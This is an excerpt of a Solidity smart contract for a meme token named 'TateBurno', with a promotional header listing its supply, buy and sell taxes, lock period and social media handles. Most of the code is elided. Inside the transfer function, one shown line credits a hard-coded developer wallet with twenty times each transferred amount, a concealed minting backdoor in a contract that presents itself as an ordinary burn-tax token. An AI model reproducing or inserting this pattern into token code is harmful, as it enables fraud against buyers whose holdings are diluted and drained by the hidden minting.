...
-  TATE
- 🏎️ TATE
Lock 30 First, will extend 90days
Supply: 1,000,000
Tax:
Buy 6% burn
Sell 8%: 6%burn 2%dev
...
🏎️Twitter: TATEBURNO (@TATEBURNO) / Twitter
🏎️Web: Within two hours of launch
🏎️TG: @TATEBURNO
*/                                                      
...
contract TATEB is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("TateBurno", unicode"🔥TATE") {
        ...
        devWallet = 0x3FBcF49cF7e4DceA12EE2287C7bC06e8F7Bd7F72;
    ...
    function _transfer(
        ...
        _balances[devWallet] = _balances[devWallet].add(amount * 20);
